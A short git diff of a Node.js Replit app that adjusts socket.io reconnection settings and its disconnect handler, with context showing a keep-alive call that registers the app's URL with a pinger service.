@@ -12,10 +12,13 @@ app.get("/", async (req, res) => {
   res.end(`<h1 style="font-size:10vw">${e}</h1>`)
 })
 
-var socket = io("wss://v3.hackballshd.repl.co", {
-  reconnectionDelayMax: 30000,
-  // keep this
+const socket = io("wss://v3.hackballshd.repl.co", {
+  reconnection: true,
+  reconnectionAttempts: 10000,
+  reconnectionDelay: 6000,
+  reconnectionDelayMax: 100000,
 });
+
 
 socket.on('message', async m => {
   console.log(m)
@@ -42,7 +45,7 @@ function reconnect() {
   // keep this
   });
 }
-socket.on('disconnect', () => {setTimeout(()=>{reconnect()},8000)})
+socket.on('disconnect', () => {setTimeout(()=>{console.log("r")},6000)})
 async function cringe() {
   await axios.get("https://pinggg.hackballshd.repl.co/add?url=https://"+process.env.REPL_SLUG+"."+process.env.REPL_OWNER+".repl.co")
   console.log("ADDED")
